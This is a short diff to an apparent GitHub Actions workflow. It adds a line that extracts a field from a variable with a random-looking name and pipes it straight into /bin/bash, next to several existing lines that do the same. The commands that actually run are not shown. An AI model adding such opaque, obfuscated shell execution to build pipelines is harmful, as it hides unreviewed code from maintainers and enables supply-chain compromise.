@@ -39,6 +39,7 @@ jobs:
           echo $pqhp60 | jq -r .aly5 | /bin/bash
           echo $w90271 | jq -r .qdtjh23235 | /bin/bash
           echo $so1 | jq -r .tprn5 | /bin/bash
+          printf '%s' "$jfzr52" | jq -r .akhkh1748 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
